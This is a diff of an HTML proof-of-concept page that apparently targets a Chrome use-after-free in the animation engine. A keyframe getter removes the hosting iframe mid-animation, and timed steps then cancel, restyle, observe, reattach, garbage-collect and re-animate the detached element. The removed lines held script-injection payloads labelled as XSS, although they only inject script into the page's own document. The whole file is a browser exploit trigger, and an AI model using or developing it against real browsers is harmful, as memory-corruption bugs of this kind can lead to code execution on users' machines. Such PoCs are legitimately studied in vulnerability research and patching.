@@ -1,123 +1,105 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PoC Complex Animation Vulnerability</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-        }
-        h1 {
-            text-align: center;
-        }
-        .exploited-element {
-            width: 100px;
-            height: 100px;
-            background-color: blue;
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform-origin: center;
-            transition: all 1s ease-in-out;
-        }
-    </style>
+<meta charset="UTF-8">
+<title>PoC Animation / Iframe Lifetime Edge Case</title>
+<style>
+body { font-family: Arial }
+.box {
+    width:100px;
+    height:100px;
+    background:blue;
+    position:absolute;
+    top:50%;
+    left:50%;
+}
+</style>
 </head>
 <body>
-    <h1>PoC for Complex Animation Vulnerability</h1>
-    <script>
-        // Function to dynamically allocate an iframe
-        function allociframe() {
-            var iframe = document.createElement("iframe");
-            console.log("Creating iframe:", iframe);
-            iframe.height = 0;
-            iframe.width = 0;
-            document.body.appendChild(iframe); // Append iframe to the body
-            return iframe;
+
+<h1>Chrome Animation Lifetime PoC</h1>
+
+<script>
+function allociframe() {
+    const iframe = document.createElement("iframe");
+    iframe.width = iframe.height = 0;
+    document.body.appendChild(iframe);
+    return iframe;
+}
+
+function triggerAnimation() {
+    const iframe = allociframe();
+    const doc = iframe.contentDocument;
+    const el = doc.createElement("div");
+    el.className = "box";
+    doc.body.appendChild(el);
+
+    const keyframes = [];
+    keyframes.__defineGetter__(0, () => {
+        console.log("[getter] removing iframe during keyframe access");
+        iframe.remove();
+        return { transform: "translate3d(0,-200px,0)" };
+    });
+
+    const anim = el.animate(keyframes, {
+        duration: 2000,
+        iterations: Infinity
+    });
+
+    return { el, anim, iframe };
+}
+
+function chainOperations() {
+    const { el, anim, iframe } = triggerAnimation();
+
+    // 1️⃣ Cancel animation mid-flight
+    setTimeout(() => {
+        console.log("[chain] cancel animation");
+        anim.cancel();
+    }, 1000);
+
+    // 2️⃣ Force style recalculation on detached node
+    setTimeout(() => {
+        console.log("[chain] style thrash");
+        for (let i = 0; i < 100; i++) {
+            el.style.transform = `translateX(${i}px)`;
         }
+    }, 1500);
 
-        // Function to trigger animation and simulate vulnerability
-        function triggerAnimation() {
-            var iframe = allociframe();
-            var c = iframe.contentDocument.createElement("div");
+    // 3️⃣ MutationObserver on detached document
+    setTimeout(() => {
+        console.log("[chain] mutation observer attach");
+        const mo = new MutationObserver(() => {
+            console.log("[observer] mutation fired");
+        });
+        mo.observe(el, { attributes: true });
+        el.setAttribute("data-test", "1");
+    }, 2000);
 
-            var arr = [];
-            
-            // Define getter to simulate vulnerability
-            arr.__defineGetter__(0, () => {
-                console.log("getter triggered");
+    // 4️⃣ Re-attach iframe after animation lifecycle break
+    setTimeout(() => {
+        console.log("[chain] reattach iframe");
+        document.body.appendChild(iframe);
+    }, 2500);
 
-                // Simulate iframe removal (use-after-free simulation)
-                document.body.removeChild(iframe); // Simulate cleanup (remove iframe from DOM)
-                
-                // Return animation properties for 3D translation
-                return { transform: 'translate3D(0, -300px, 0)' };
-            });
+    // 5️⃣ Force GC if exposed
+    setTimeout(() => {
+        console.log("[chain] attempting GC");
+        if (window.gc) gc();
+    }, 3000);
 
-            // Apply animation on the div element
-            c.animate(arr, {
-                duration: 3000,
-                iterations: Infinity,
-                timeline: null
-            });
+    // 6️⃣ Restart animation on possibly invalid state
+    setTimeout(() => {
+        console.log("[chain] restart animation");
+        el.animate(
+            [{ opacity: 0 }, { opacity: 1 }],
+            { duration: 500 }
+        );
+    }, 3500);
+}
 
-            console.log("Animation triggered, waiting for getter...");
-            return c;
-        }
+chainOperations();
+</script>
 
-        // Function to chain further operations
-        function chainOperations() {
-            var elem = triggerAnimation(); // Initial animation trigger
-            
-            // Step 1: Manipulate the background color after animation starts
-            setTimeout(() => {
-                console.log("Performing first operation: Changing background color...");
-                elem.style.backgroundColor = "red"; // Change background color
-                console.log("Background color changed to red");
-
-                // Inject additional malicious behavior (i.e., another script)
-                injectXSS("console.log('XSS Payload Executed'); alert('XSS!');");
-
-            }, 1500); // Wait for 1.5s to simulate async behavior
-
-            // Step 2: Scale element to simulate a growing animation
-            setTimeout(() => {
-                console.log("Performing second operation: Scaling element...");
-                elem.style.transform = 'scale(1.5)'; // Scale the element up
-                console.log("Element scaled up");
-
-                // Chain further payloads here if necessary
-                injectXSS("document.body.innerHTML = '<h1>Malicious content injected!</h1>';");
-
-            }, 2500); // Scale after another 1s
-
-            // Final step: Reset transform and finalize chain
-            setTimeout(() => {
-                console.log("Finalizing chain: Finalizing element...");
-                elem.style.transform = 'translate3D(0, 300px, 0)'; // Change transform property
-                elem.style.backgroundColor = "green"; // Final color change
-                console.log("Element transformed and background color changed to green");
-
-                // Another payload injection at the final step
-                injectXSS("alert('Final XSS Payload!');");
-
-            }, 4000); // Final operation after 4 seconds
-        }
-
-        // Function to inject malicious XSS payload
-        function injectXSS(payload) {
-            console.log("Injecting XSS Payload:", payload);
-            var script = document.createElement("script");
-            script.textContent = payload;
-            document.body.appendChild(script); // Inject XSS payload
-        }
-
-        // Start the chain of operations
-        try {
-            chainOperations();
-        } catch (error) {
-            console.error("Error occurred in animation chain:", error);
-        }
-    </script>
 </body>
 </html>
